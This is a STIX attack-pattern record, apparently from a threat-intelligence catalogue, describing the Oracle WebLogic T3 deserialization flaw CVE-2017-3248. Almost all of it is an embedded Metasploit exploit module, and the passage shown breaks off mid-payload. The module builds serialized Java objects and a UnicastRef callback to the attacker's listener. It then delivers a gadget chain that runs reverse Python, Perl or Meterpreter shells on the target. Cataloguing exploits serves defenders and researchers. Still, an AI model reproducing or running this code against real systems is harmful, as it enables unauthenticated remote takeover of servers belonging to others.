{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--3fe577d0-1fb7-4796-a525-9a4e91ecc161",
    "created": "2024-08-14T17:06:53.805843Z",
    "modified": "2024-08-14T17:06:53.805848Z",
    "name": "Oracle Weblogic Server Deserialization RCE - RMI UnicastRef",
    "description": " An unauthenticated attacker with network access to the Oracle Weblogic Server T3 interface can send a serialized object (sun.rmi.server.UnicastRef) to the interface to execute code on vulnerable hosts. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/weblogic_deserialize_unicastref.rb",
            "external_id": "weblogic_deserialize_unicastref.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2017-3248"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::TcpServer\n  #include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Powershell\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name' => 'Oracle Weblogic Server Deserialization RCE - RMI UnicastRef',\n      'Description' => %q{\n        An unauthenticated attacker with network access to the Oracle Weblogic Server T3\n        interface can send a serialized object (sun.rmi.server.UnicastRef)\n        to the interface to execute code on vulnerable hosts.\n      },\n      'Author' =>\n        [\n        'Andres Rodriguez',  # Metasploit Module - 2Secure (@acamro, acamro[at]gmail.com)\n        'Jacob Baines',      # Vulnerability Discovery - Tenable Network Security\n        'Aaron Soto'         # Reverse Engineering JSO and ysoserial blobs\n        ],\n      'License' => MSF_LICENSE,\n      'References' =>\n        [\n          ['CVE', '2017-3248']\n        ],\n      'Privileged' => false,\n      'Platform' => %w{ unix win solaris },\n      'Targets' =>\n        [\n          [ 'Unix',\n            'Platform' => 'unix',\n            'Arch' => ARCH_CMD,\n            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_python'},\n            'Payload' => {\n              'Encoder' => 'cmd/ifs',\n              'BadChars' => ' ',\n              'Compat' => {'PayloadType' => 'cmd', 'RequiredCmd' => 'python'}\n            }\n          ],\n          [ 'Windows',\n            'Platform' => 'win',\n            'Payload' => {},\n            'DefaultOptions' => {'PAYLOAD' => 'windows/meterpreter/reverse_tcp'}\n          ],\n          [ 'Solaris',\n            'Platform' => 'solaris',\n            'Arch' => ARCH_CMD,\n            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_perl'},\n            'Payload' => {\n              'Space'       => 2048,\n              'DisableNops' => true,\n              'Compat'      =>\n                {\n                  'PayloadType' => 'cmd',\n                  'RequiredCmd' => 'generic perl telnet',\n                }\n            }\n          ]\n        ],\n      'DefaultTarget' => 0,\n      'DefaultOptions' =>\n        {\n          'WfsDelay' => 12\n        },\n      'DisclosureDate' => '2017-01-25'))\n\n    register_options([Opt::RPORT(7001)])\n  end\n\n=begin   This check is currently incompatible with the Tcp mixin.  :-(\n  def check\n    resp = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => '/console/login/LoginForm.jsp'\n    )\n\n    return CheckCode::Unknown unless resp && resp.code == 200\n\n    unless resp.body.include?('Oracle WebLogic Server Administration Console')\n      vprint_warning(\"Oracle WebLogic Server banner cannot be found\")\n      return CheckCode::Unknown\n    end\n\n    /WebLogic Server Version: (?<version>\\d+\\.\\d+\\.\\d+\\.\\d*)/ =~ resp.body\n    unless version\n      vprint_warning(\"Oracle WebLogic Server version cannot be found\")\n      return CheckCode::Unknown\n    end\n\n    version = Rex::Version.new(version)\n    vprint_good(\"Detected Oracle WebLogic Server Version: #{version}\")\n    case\n    when version.to_s.start_with?('10.3')\n      return CheckCode::Appears unless version > Rex::Version.new('10.3.6.0')\n    when version.to_s.start_with?('12.1.3')\n      return CheckCode::Appears unless version > Rex::Version.new('12.1.3.0')\n    when version.to_s.start_with?('12.2')\n      return CheckCode::Appears unless version > Rex::Version.new('12.2.1.1')\n    end\n\n    return CheckCode::Safe\n  end\n=end\n\n  def gen_resp\n    if target.name == 'Windows'\n      pwrshl = cmd_psh_payload(payload.encoded, payload_instance.arch.first, {remove_comspec: true})\n      mycmd = pwrshl.each_byte.map {|b| b.to_s(16)}.join\n    elsif target.name == 'Unix' || target.name == 'Solaris'\n      nix_cmd = payload.encoded\n      mycmd = nix_cmd.each_byte.map {|b| b.to_s(16)}.join\n    end\n\n    serialized_cmd = (mycmd.length >> 1).to_s(16).rjust(4,'0')\n    serialized_cmd << mycmd\n\n    # Response data taken from JRMPListener generated data:\n    # java -cp ysoserial-0.0.5-all.jar ysoserial.exploit.JRMPListener <lport> CommonsCollections1 calc.exe\n    # Modified captured network traffic bytes. Patch in command to run\n    # TODO: Migrate this functionality to the new JavaDeserialization utilities\n    @resp = '51aced0005770f02086f5ef3000001651a67984d80017372002e6a617661782e'\n    @resp << '6d616e6167656d656e742e42616441747472696275746556616c756545787045'\n    @resp << '7863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176'\n    @resp << '612f6c616e672f4f626a6563743b70787200136a6176612e6c616e672e457863'\n    @resp << '657074696f6ed0fd1f3e1a3b1cc402000070787200136a6176612e6c616e672e'\n    @resp << '5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c'\n    @resp << '6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573'\n    @resp << '736167657400124c6a6176612f6c616e672f537472696e673b5b000a73746163'\n    @resp << '6b547261636574001e5b4c6a6176612f6c616e672f537461636b547261636545'\n    @resp << '6c656d656e743b4c001473757070726573736564457863657074696f6e737400'\n    @resp << '104c6a6176612f7574696c2f4c6973743b70787071007e0008707572001e5b4c'\n    @resp << '6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c'\n    @resp << '3cfd2239020000707870000000047372001b6a6176612e6c616e672e53746163'\n    @resp << '6b5472616365456c656d656e746109c59a2636dd8502000449000a6c696e654e'\n    @resp << '756d6265724c000e6465636c6172696e67436c61737371007e00054c00086669'\n    @resp << '6c654e616d6571007e00054c000a6d6574686f644e616d6571007e0005707870'\n    @resp << '0000011b74001e79736f73657269616c2e6578706c6f69742e4a524d504c6973'\n    @resp << '74656e65727400114a524d504c697374656e65722e6a617661740006646f4361'\n    @resp << '6c6c7371007e000b000000e071007e000d71007e000e740009646f4d65737361'\n    @resp << '67657371007e000b000000ab71007e000d71007e000e74000372756e7371007e'\n    @resp << '000b0000007771007e000d71007e000e7400046d61696e737200266a6176612e'\n    @resp << '7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c6973'\n    @resp << '74fc0f2531b5ec8e100200014c00046c69737471007e0007707872002c6a6176'\n    @resp << '612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c6543'\n    @resp << '6f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a617661'\n    @resp << '2f7574696c2f436f6c6c656374696f6e3b707870737200136a6176612e757469'\n    @resp << '6c2e41727261794c6973747881d21d99c7619d03000149000473697a65707870'\n    @resp << '000000007704000000007871007e001b787372003273756e2e7265666c656374'\n    @resp << '2e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f636174696f6e'\n    @resp << '48616e646c657255caf50f15cb7ea50200024c000c6d656d62657256616c7565'\n    @resp << '7374000f4c6a6176612f7574696c2f4d61703b4c0004747970657400114c6a61'\n    @resp << '76612f6c616e672f436c6173733b707870737d00000001000d6a6176612e7574'\n    @resp << '696c2e4d617074001066696c653a2f746d702f73732e6a6172787200176a6176'\n    @resp << '612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c'\n    @resp << '0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174'\n    @resp << '696f6e48616e646c65723b7078707371007e001c7372002a6f72672e61706163'\n    @resp << '68652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d'\n    @resp << '61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f61'\n    @resp << '70616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e7366'\n    @resp << '6f726d65723b74001066696c653a2f746d702f73732e6a617278707372003a6f'\n    @resp << '72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6675'\n    @resp << '6e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97'\n    @resp << '040200015b000d695472616e73666f726d65727374002d5b4c6f72672f617061'\n    @resp << '6368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f72'\n    @resp << '6d65723b74001066696c653a2f746d702f73732e6a617278707572002d5b4c6f'\n    @resp << '72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472'\n    @resp << '616e73666f726d65723bbd562af1d834189902000074001066696c653a2f746d'\n    @resp << '702f73732e6a61727870000000057372003b6f72672e6170616368652e636f6d'\n    @resp << '6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e737461'\n    @resp << '6e745472616e73666f726d6572587690114102b1940200014c000969436f6e73'\n    @resp << '74616e7471007e000174001066696c653a2f746d702f73732e6a617278707672'\n    @resp << '00116a6176612e6c616e672e52756e74696d6500000000000000000000007078'\n    @resp << '707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c65637469'\n    @resp << '6f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287'\n    @resp << 'e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e67'\n    @resp << '2f4f626a6563743b4c000b694d6574686f644e616d6571007e00055b000b6950'\n    @resp << '6172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7400'\n    @resp << '1066696c653a2f746d702f73732e6a61727870757200135b4c6a6176612e6c61'\n    @resp << '6e672e4f626a6563743b90ce589f1073296c0200007078700000000274000a67'\n    @resp << '657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab'\n    @resp << '16d7aecbcd5a99020000707870000000007400096765744d6574686f64757100'\n    @resp << '7e003e00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a'\n    @resp << '3bb3420200007078707671007e003e7371007e00367571007e003b0000000270'\n    @resp << '7571007e003b00000000740006696e766f6b657571007e003e00000002767200'\n    @resp << '106a6176612e6c616e672e4f626a656374000000000000000000000070787076'\n    @resp << '71007e003b7371007e0036757200135b4c6a6176612e6c616e672e537472696e'\n    @resp << '673badd256e7e91d7b470200007078700000000174'\n\n    @resp << serialized_cmd\n\n    @resp << '74'\n    @resp << '0004657865637571007e003e0000000171007e00437371007e0031737200116a'\n    @resp << '6176612e6c616e672e496e746567657212e2a0a4f78187380200014900057661'\n    @resp << '6c756570787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b'\n    @resp << '02000070787000000001737200116a6176612e7574696c2e486173684d617005'\n    @resp << '07dac1c31660d103000246000a6c6f6164466163746f72490009746872657368'\n    @resp << '6f6c647078703f40000000000000770800000010000000007878767200126a61'\n    @resp << '76612e6c616e672e4f7665727269646500000000000000000000007078707100'\n    @resp << '7e005a'\n  end\n\n  def on_client_connect(client)\n    # Make sure to only sent one meterpreter payload to a host.\n    # (or as long as the server was listening).\n    vprint_status(\"Comparing host: #{client.peerhost}\")\n    if @met_sent.include?(client.peerhost) then return end\n    @met_sent << client.peerhost\n\n    print_status(\"Sending payload to client: #{client.peerhost}\")\n\n    # Response format determined by watching network traffic\n    accept_conn = '4e00'\n    raccept_conn = client.peerhost.each_byte.map {|b| b.to_s(16)}.join\n    accept_conn << (raccept_conn.length >> 1).to_s(16).rjust(2,'0')\n    accept_conn << raccept_conn\n    accept_conn << '0000'\n    accept_conn << client.peerport.to_s(16).rjust(4,'0')\n\n    client.put([accept_conn].pack('H*'))\n    client.get_once\n    client.get_once\n    client.put([@resp].pack('H*'))\n    client.get_once\n\n    service.close_client(client)\n  end\n\n  def t3_handshake\n    # retrieved from network traffic\n    shake = \"t3 12.2.1\\n\"\n    shake << \"AS:255\\n\"\n    shake << \"HL:19\\n\"\n    shake << \"MS:10000000\\n\\n\"\n\n    sock.put(shake)\n    sleep(1)\n    sock.get_once\n  end\n\n  def build_t3_request_object\n    # T3 request serialized data\n    # retrieved by watching network traffic\n    # This is a proprietary, undocumented protocol\n    data =  '000005c3'                                     # lenght of the packet\n    data << '01'                                           # CMD_IDENTIFY_REQUEST\n    data << '65'                                           # QOS\n    data << '01'                                           # Flags:\n                                                           #   CONTEXT_JVMID_FLAG = 1 (has JVMIDs)\n                                                           #   CONTEXT_TX_FLAG = 2\n                                                           #   CONTEXT_TRACE_FLAG = 4\n                                                           #   CONTEXT_EXTENDED_FLAG = 8\n                                                           #   CONTEXT_EXTENDED_USER_FLAG = 16\n    data << 'ffffffff'                                     # response id\n    data << 'ffffffff'                                     # invocable id\n    data << '0000006a'                                     # abbrev offset\n    data << '0000ea60'                                     # reconnect timeout ??\n\n    # TODO: WHAT DOES THIS DO?  CAN WE RANDOMIZE ANY OF IT?\n    data << '0000001900937b484a56fa4a777666f581daa4f5b9'\n    data << '0e2aebfc607499b402797372007872017872027870'\n    data << '0000000a0000000300000000000000060070707070'\n    data << '70700000000a000000030000000000000006007006'\n\n    data << 'fe010000'                                     # ----- separator -----\n\n    data << 'aced0005'                                     # JSO v5 header\n    data << '73'                                           # object header\n    data << '72001d'                                       # className (29 bytes):\n    data << '7765626c6f6769632e726a766d2e436c617373'       #   weblogic.rjvm.ClassTableEntry\n    data << '5461626c65456e747279'                         #   (continued)\n    data << '2f52658157f4f9ed'                             #   serialVersionUID\n    data << '0c00007870'                                   #   remainder of object header\n    data << '72'                                           # object header\n    data << '00247765626c6f6769632e636f6d6d6f6e2e696e74'   #   className (36 bytes): weblogic.common.internal.PackageInfo\n    data << '65726e616c2e5061636b616765496e666f'           #   (continued)\n    data << 'e6f723e7b8ae1ec9'                             #   serialVersionUID\n    data << '02'                                           #   SC_SERIALIZABLE\n    data << '0008'                                         #   fieldCount = 8\n    data << '4900056d616a6f72'                             #     0: Int: major\n    data << '4900056d696e6f72'                             #     1: Int: minor\n    data << '49000c726f6c6c696e675061746368'               #     2: Int rollingPatch\n    data << '49000b736572766963655061636b'                 #     3: Int: servicePack\n    data << '5a000e74656d706f726172795061746368'           #     4: Bool: temporaryPatch\n    data << '4c0009696d706c5469746c65'                     #     5: Obj: implTitle\n    data << '7400124c6a6176612f6c616e672f537472696e673b'   #        java/lang/String\n    data << '4c000a696d706c56656e646f72'                   #     6: Obj: implVendor\n    data << '71007e0003'                                   #        (Handle) 0x007e0003\n    data << '4c000b696d706c56657273696f6e'                 #     7: Obj: implVersion\n    data << '71007e0003'                                   #        (Handle) 0x007e0003\n    data << '78707702000078'                               #   block footers\n\n    data << 'fe010000'                                     # ----- separator -----\n\n    data << 'aced0005'                                     # JSO v5 header\n    data << '7372'                                         # object header\n    data << '001d7765626c6f6769632e726a766d2e436c6173'     # className (29 bytes): weblogic.rjvm.ClassTableEntry\n    data << '735461626c65456e747279'                       #    (continued)\n    data << '2f52658157f4f9ed'                             # serialVersionUID\n    data << '0c'                                           # EXTERNALIZABLE | BLOCKDATA\n    data << '00007870'                                     # remainder of object header\n    data << '72'                                           # object header\n    data << '00247765626c6f6769632e636f6d6d6f6e2e696'      # className (36 bytes): weblogic.common.internal.VersionInfo\n    data << 'e7465726e616c2e56657273696f6e496e666f'        #    (continued)\n    data << '972245516452463e'                             # serialVersionUID\n    data << '02'                                           # SC_SERIALIZABLE\n    data << '0003'                                         #   fieldCount = 3\n    data << '5b0008'                                       #   array header (8 bytes)\n    data << '7061636b61676573'                             #     ARRAY NAME = 'packages'\n    data << '740027'                                       #     TC_STRING className1 (39 bytes)\n    data << '5b4c7765626c6f6769632f636f6d6d6f6e2f69'       #       weblogic/common/internal/PackageInfo\n    data << '6e7465726e616c2f5061636b616765496e666f'       #       (continued)\n    data << '3b'                                           #       (continued)\n    data << '4c000e'                                       #   object header (14 bytes)\n    data << '72656c6561736556657273696f6e'                 #     releaseVersion\n    data << '740012'                                       #     TC_STRING (18 bytes)\n    data << '4c6a6176612f6c616e672f537472696e673b'         #       versionInfoAsBytes\n    data << '5b0012'                                       #   array header (18 bytes)\n    data << '76657273696f6e496e666f41734279746573'         #     ARRAY NAME = java/lang/String;\n    data << '740002'                                       #     TC_STRING (2 bytes)\n    data << '5b42'                                         #       0x5b42 = [B\n    data << '78'                                           # block footer\n\n    data << '720024'                                       # class (36 bytes)\n    data << '7765626c6f6769632e636f6d6d6f6e2e696e'         #   weblogic.common.internal.PackageInfo\n    data << '7465726e616c2e5061636b616765496e666f'         #   (continued)\n    data << 'e6f723e7b8ae1ec9'                             #   serialVersionUID\n\n    data << '02'                                           #   SC_SERIALIZABLE\n    data << '0008'                                         #   fieldCount = 8\n    data << '4900056d616a6f72'                             #   0: Int: major\n    data << '4900056d696e6f72'                             #   1: Int: minor\n    data << '49000c726f6c6c696e675061746368'               #   2: Int rollingPatch\n    data << '49000b736572766963655061636b'                 #   3: Int: servicePack\n    data << '5a000e74656d706f726172795061746368'           #   4: Bool: temporaryPatch\n    data << '4c0009696d706c5469746c65'                     #   5: Obj: implTitle\n    data << '71'                                           #      TC_REFERENCE\n    data << '007e0004'                                     #      Handle = 0x007e0004\n    data << '4c000a696d706c56656e646f72'                   #   6: Obj: implVendor\n    data << '71'                                           #      TC_REFERENCE\n    data << '007e0004'                                     #      Handle = 0x007e0004\n    data << '4c000b696d706c56657273696f6e'                 #   7: Obj: implVersion\n    data << '71'                                           #      TC_REFERENCE\n    data << '007e0004'                                     #      Handle = 0x007e0004\n    data << '78'                                           # class footer\n    data << '70'                                           # TC_NULL\n    data << '77020000'                                     # BLOCKDATA (2 bytes): 0x0000\n    data << '78'                                           # block footer\n\n    data << 'fe010000'                                     # ----- separator -----\n\n    data << 'aced0005'                                     # JSO v5 header\n    data << '73'                                           # object header\n    data << '72001d'                                       # className (29 bytes):\n    data << '7765626c6f6769632e726a766d2e436c617373'       #   weblogic.rjvm.ClassTableEntry\n    data << '5461626c65456e747279'                         #   (continued)\n    data << '2f52658157f4f9ed'                             #   serialVersionUID\n    data << '0c00007870'                                   #   remainder of object header\n    data << '720021'                                       # className (33 bytes)\n    data << '7765626c6f6769632e636f6d6d6f6e2e696e74'       #   weblogic.common.internal.PeerInfo\n    data << '65726e616c2e50656572496e666f'                 #   (continued)\n    data << '585474f39bc908f1'                             #   serialVersionUID\n    data << '02'                                           #   SC_SERIALIZABLE\n    data << '0006'                                         #   fieldCount = 6\n    data << '4900056d616a6f72'                             #     0: Int: major\n    data << '4900056d696e6f72'                             #     1: Int: minor\n    data << '49000c726f6c6c696e675061746368'               #     2: Int rollingPatch\n    data << '49000b736572766963655061636b'                 #     3: Int: servicePack\n    data << '5a000e74656d706f726172795061746368'           #     4: Bool: temporaryPatch\n    data << '5b00087061636b61676573'                       #     5: Array: packages\n    data << '740027'                                       #        TC_STRING (39 bytes)\n    data << '5b4c7765626c6f6769632f636f6d6d6f6e2f69'       #        Lweblogic/common/internal/PackageInfo;\n    data << '6e7465726e616c2f5061636b616765496e666f'       #        (continued)\n    data << '3b'                                           #        (continued)\n    data << '78'                                           # block footer\n    data << '720024'                                       # class (36 bytes)\n    data << '7765626c6f6769632e636f6d6d6f6e2e696e74'       #   Lweblogic/common/internal/PackageInfo;\n    data << '65726e616c2e56657273696f6e496e666f'           #   (continued)\n    data << '972245516452463e'                             #   serialVersionUID\n    data << '02'                                           #   SC_SERIALIZABLE\n    data << '0003'                                         #   fieldCount = 3\n    data << '5b0008'                                       #   0: Array\n    data << '7061636b6167657371'                           #      packages\n    data << '007e0003'                                     #      Handle = 0x00730003\n    data << '4c000e72656c6561736556657273696f6e'           #   1: Obj: releaseVersion\n    data << '7400124c6a6176612f6c616e672f537472696e673b'   #      Ljava/lang/String;\n    data << '5b001276657273696f6e496e666f41734279746573'   #   2: Array: versionInfoAsBytes\n    data << '740002'                                       #      TC_STRING (2 bytes)\n    data << '5b42'                                         #      VALUE = 0x5b42 = [B\n    data << '78'                                           # block footer\n    data << '720024'                                       # class: (36 bytes)\n    data << '7765626c6f6769632e636f6d6d6f6e2e696e746572'   #   Name = weblogic.common.internal.PackageInfo\n    data << '6e616c2e5061636b616765496e666f'               #   (continued)\n    data << 'e6f723e7b8ae1ec9'                             #   serialVersionUID\n    data << '02'                                           #   SC_SERIALIZABLE\n    data << '0008'                                         #   fieldCount = 8\n    data << '4900056d616a6f72'                             #   0: Int: major\n    data << '4900056d696e6f72'                             #   1: Int: minor\n    data << '49000c726f6c6c696e675061746368'               #   2: Int rollingPatch\n    data << '49000b736572766963655061636b'                 #   3: Int: servicePack\n    data << '5a000e74656d706f726172795061746368'           #   4: Bool: temporaryPatch\n    data << '4c0009696d706c5469746c65'                     #   5: Obj: implTitle\n    data << '71'                                           #      TC_REFERENCE\n    data << '007e0005'                                     #      Handle = 0x007e0005\n    data << '4c000a696d706c56656e646f72'                   #   6: Obj: implVendor\n    data << '71'                                           #      TC_REFERENCE\n    data << '007e0005'                                     #      Handle = 0x007e0005\n    data << '4c000b696d706c56657273696f6e'                 #   7: Obj: implVersion\n    data << '71'                                           #      TC_REFERENCE\n    data << '007e0005'                                     #      Handle = 0x007e0005\n    data << '78'                                           # class footer\n    data << '707702000078'                                 # block footers\n\n    data << 'fe00ff'                                       # whatever this cruft is again\n\n    data << 'fe010000'                                     # ----- separator -----\n\n    # weblogic.rjvm.JVMID object\n    data << 'aced0005'                                     # JSO v5 header\n    data << '73'                                           # object header\n    data << '720013'                                       #   class (19 bytes)\n    data << '7765626c6f6769632e726a766d2e4a564d4944'       #   name = 'weblogic.rjvm.JVMID'\n    data << 'dc49c23ede121e2a'                             #   serialVersionUID\n    data << '0c'                                           #   EXTERNALIZABLE | BLOCKDATA\n    data << '0000'                                         #   fieldCount = 0   (!!!)\n    data << '78'                                           # block footer\n    data << '70'                                           # NULL\n    data << '7750'                                         # block header (80 bytes)\n    data << '21'                                           #   !\n    data << '000000000000000000'                           #   9 NULL BYTES\n    data << '0d'                                           #   \\n\n    #data << '3139322e3136382e312e323237'                  #   original PoC string = 192.168.1.227\n    data << '3030302e3030302e3030302e30'                   #   new string = 000.000.000.0\n                                                           #      (must be an IP, and length isn't trivially editable)\n    data << '00'                                           #   \\0\n    data << '12'                                           #   strLength = 18 bytes\n    #data << '57494e2d4147444d565155423154362e6568'        #   original str = WIN-AGDMVQUB1T6.eh\n    data << rand_text_alphanumeric(18).unpack('H*')[0]\n    data << '83348cd6'                                     #   ??? UNKNOWN ???  (Note: Cannot be randomized)\n    data << '000000070000'                                 #   ??? UNKNOWN ???\n    data << rport.to_s(16).rjust(4, '0')                   #   callback port\n    data << 'ffffffffffffffffffffffffffffffffffffff'       #   ??? UNKNOWN ???\n    data << 'ffffffffff'                                   #   ??? UNKNOWN ???\n    data << '78'                                           # block footer\n\n    data << 'fe010000'                                     # ----- separator -----\n\n    # weblogic.rjvm.JVMID object\n    data << 'aced0005'                                     # JSO v5 header\n    data << '73'                                           # object header\n    data << '72'                                           #   class\n    data << '00137765626c6f6769632e726a766d2e4a564d4944'   #   Name: weblogic.rjvm.JVMID\n    data << 'dc49c23ede121e2a'                             #   serialVersionUID\n    data << '0c'                                           #   EXTERNALIZABLE | BLOCKDATA\n    data << '0000'                                         #   fieldCount = 0\n    data << '78'                                           # end block\n    data << '70'                                           # TC_NULL\n    data << '77'                                           # block header\n    data << '20'                                           #   length = 32 bytes\n    data << '0114dc42bd071a772700'                         #     ??? UNKNOWN ???\n    #data << rand_text_alphanumeric(10).unpack('H*')[0]    #     (NOTE: RANDOMIZAITON BREAKS THINGS)\n    data << '0d'                                           #     \\n\n    #data << '3234322e3231342e312e323534'                  #     original string = 242.214.1.254\n    data << '3030302e3030302e3030302e30'                   #     new string = 000.000.000.0\n                                                           #      (must be an IP, and length isn't trivially editable)\n    #data << '61863d1d'                                    #     original string = ??? UNKNOWN ???\n    data << rand_text_alphanumeric(4).unpack('H*')[0]      #     new = randomized\n    data << '00000000'                                     #     NULL BYTES\n    data << '78'                                           # block footer\n\n    sock.put([data].pack('H*'))\n    sleep(1)\n    sock.get_once\n  end\n\n  def send_payload_objdata\n    shost = srvhost\n    if ['0.0.0.0', '127.0.0.1', '::'].include?(shost)\n      shost = Rex::Socket.source_address\n    end\n\n    # JRMPClient payload generated from ysoserial:\n    # Patch in srvhost and srvport\n    # TODO: Migrate this functionality to the new JavaDeserialization utilities\n    payload = '056508000000010000001b0000005d0101007372017870737202787000000000'\n    payload << '00000000757203787000000000787400087765626c6f67696375720478700000'\n    payload << '000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306'\n\n    payload << 'fe010000'                                  # ----- separator -----\n\n    payload << 'aced0005'                                  # JSO v5 header\n    payload << '73'                                        # object header\n    payload << '72'                                        #   class\n    payload << '001d7765626c6f6769632e726a766d2e436c61'    #   Name: weblogic.rjvm.ClassTableEntry\n    payload << '73735461626c65456e747279'                  #     (cont)\n    payload << '2f52658157f4f9ed'                          #   serialVersionUID\n    payload << '0c'                                        #   EXTERNALIZABLE | BLOCKDATA\n    payload << '0000'                                      #   fieldCount = 0\n    payload << '7870'                                      #   remaining object header\n    payload << '72'                                        # class header\n    payload << '00025b42'                                  #   Name: 0x5b42\n    payload << 'acf317f8060854e0'                          #   serialVersionUID\n    payload << '02'                                        #   SERIALIZABLE\n    payload << '0000'                                      #   fieldCount = 0\n    payload << '7870'                                      #   class footer\n    payload << '77'                                        # block header\n    payload << '020000'                                    #   contents = 0x0000\n    payload << '78'                                        #   block footer\n\n    payload << 'fe010000'                                  # ----- separator -----\n\n    payload << 'aced0005'                                  # JSO v5 header\n    payload << '73'                                        # object header\n    payload << '72'                                        #   class\n    payload << '001d7765626c6f6769632e726a766d2e436c61'    #   Name: weblogic.rjvm.ClassTableEntry\n    payload << '73735461626c65456e747279'                  #     (cont)\n    payload << '2f52658157f4f9ed'                          #   serialVersionUID\n    payload << '0c'                                        #   EXTERNALIZABLE | BLOCKDATA\n    payload << '0000'                                      #   fieldCount = 0\n    payload << '7870'                                      #   remaining object header\n    payload << '72'                                        # class header\n\n    payload << '00135b4c6a6176612e6c616e672e4f626a'        #   Name: [Ljava.lang.Object;\n    payload << '6563743b'                                  #     (cont)\n    payload << '90ce589f1073296c'                          #   serialVersionUID\n    payload << '02'                                        #   SERIALIZABLE\n    payload << '0000'                                      #   fieldCount = 0\n    payload << '7870'                                      #   remaining object header\n    payload << '77'                                        # block header\n    payload << '020000'                                    #   contents = 0x0000\n    payload << '78'                                        #   block footer\n\n    payload << 'fe010000'                                  # ----- separator -----\n\n    payload << 'aced0005'                                  # JSO v5 header\n    payload << '73'                                        # object header\n    payload << '72'                                        #   class\n\n    payload << '001d7765626c6f6769632e726a766d2e436c61'    #   Name: weblogic.rjvm.ClassTableEntry\n    payload << '73735461626c65456e747279'                  #     (cont)\n    payload << '2f52658157f4f9ed'                          #   serialVersionUID\n    payload << '0c'                                        #   SERIALIZABLE | BLOCKDATA\n    payload << '0000'                                      #   fieldCount = 0\n    payload << '7870'                                      #   block footer\n    payload << '72'                                        # class header\n    payload << '00106a6176612e7574696c2e566563746f72'      #   Name: java.util.Vector\n    payload << 'd9977d5b803baf01'                          #   serialVersionUID\n    payload << '03'                                        #   WRITE_METHOD | SERIALIZABLE\n    payload << '0003'                                      #   fieldCount = 3\n    payload << '4900116361706163697479496e6372656d656e74'  #   0: Int: capacityIncrement\n    payload << '49000c656c656d656e74436f756e74'            #   1: Int: elementCount\n    payload << '5b000b656c656d656e7444617461'              #   2: Array: elementData\n    payload << '7400135b4c6a6176612f6c616e672f4f626a6563'  #   3: String: [Ljava/lang/Object;\n    payload << '743b'                                      #      (cont)\n    payload << '7870'                                      #   remaining object header\n    payload << '77'                                        # block header\n    payload << '020000'                                    #   contents = 0x0000\n    payload << '78'                                        #   block footer\n\n    payload << 'fe010000'                                  # ----- separator -----\n\n    # manually generated payload using an UnicastRef object\n    # needed parameters are patched in runtime\n    payload << 'aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265'\n    payload << '676973747279787200176a6176612e6c616e672e7265666c6563742e50726f78'\n    payload << '79e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265'\n    payload << '666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a61'\n    payload << '76612e726d692e7365727665722e52656d6f74654f626a656374496e766f6361'\n    payload << '74696f6e48616e646c657200000000000000020200007872001c6a6176612e72'\n    payload << '6d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e0300'\n    payload << '00787077'\n    # serialize the srvhost manually\n    unicast_srvhost = shost.each_byte.map { |b| b.to_s(16) }.join\n    unicast_dat = '000a556e696361737452656600'\n    unicast_dat << (unicast_srvhost.length >> 1).to_s(16).rjust(2,'0')\n    unicast_dat << unicast_srvhost\n    unicast_dat << '0000'\n    unicast_dat << srvport.to_s(16).rjust(4,'0')\n    # unique identifier (for multiple executions)\n    rand_id = rand(1..65535)\n    unicast_dat << '000000006133'\n    unicast_dat << rand_id.to_s(16).rjust(4,'0')\n    unicast_dat << '00000000000000000000000000000078'\n    payload << ((unicast_dat.length >> 1) - 1).to_s(16).rjust(2,'0')\n    payload << unicast_dat\n\n    payload << 'fe010000'                                  # ----- separator -----\n\n    # basic weblogic ImmutableServiceContext object (serialized)\n    payload << 'aced0005'                                  # JSO v5 header\n    payload << '73'                                        # object header\n    payload << '72'                                        #   class\n    payload << '00257765626c6f6769632e726a766d2e496d6d75'  #   Name: weblogic.rjvm.ImmutableServiceContext\n    payload << '7461626c6553657276696365436f6e74657874'    #     (cont)\n    payload << 'ddcba8706386f0ba'                          #   serialVersionUID\n    payload << '0c'                                        #   EXTERNALIZABLE | BLOCKDATA\n    payload << '0000'                                      #   fieldCount = 0\n    payload << '78'                         